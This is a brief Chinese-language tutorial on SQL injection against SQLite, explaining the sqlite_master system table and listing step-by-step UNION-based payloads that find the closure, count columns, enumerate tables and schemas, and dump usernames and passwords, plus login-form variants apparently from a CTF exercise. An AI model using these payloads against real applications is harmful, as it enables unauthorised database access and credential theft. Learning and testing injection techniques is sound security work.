
## **sqlite和mysql的不同**

熟悉MySQL数据库的人都知道，MySQL中有一个名为information_schema的系统库，里面包含了所有MYSQL数据库中库名，表名，列名的信息，那么SQLITE数据库有没有呢？
答案当然是没有的。对于SQLITE而言，并没有库的概念，而是直接对象就是表了，所以SQLITE没有系统库，但是它是存在系统表的，这个表名为sqlite_master

sqlite 注入的示例payload：
```
按照正常的sql注入步骤列出每一步的payload

第一步： 跟mysql一样 先试 sql语句的闭合方式
?id=' //报错
?id=' --+ //不报错

第二步： 测字段数
?id=' order by 3 --+ //不报错
?id=' order by 4 --+ //报错

第三步：可以查看一下sqlite的版本信息（没什么用），或者 直接查看数据库中的所有的表名
?id=' union select 1,2,sqlite_version() --+
?id=' union select 1,2,group_concat(tbl_name) from sqlite_master where type='table' --+

第四步：通过查询创建表的sql语句，来得到表的结构
?id=' union select 1,2,sql from sqlite_master where type='table' and tbl_name='users' --+

第五步：脱库
?id=' union select 1,group_concat(username),group_concat(password) from users limit 0,1 --+
```

```
usr=' union select 1,group_concat(tbl_name) from sqlite_master where type='table'--&pw= //查所有表
usr=' union select 1,group_concat(sql) from sqlite_master where tbl_name='Users'--&pw= //查表所有字段
//查所有内容
usr=' union select 1,group_concat(id) from Users--&pw=1
usr=' union select 1,group_concat(name) from Users--&pw=1
usr=' union select 1,group_concat(password) from Users--&pw=1
usr=' union select 1,group_concat(hint) from Users--&pw=
```

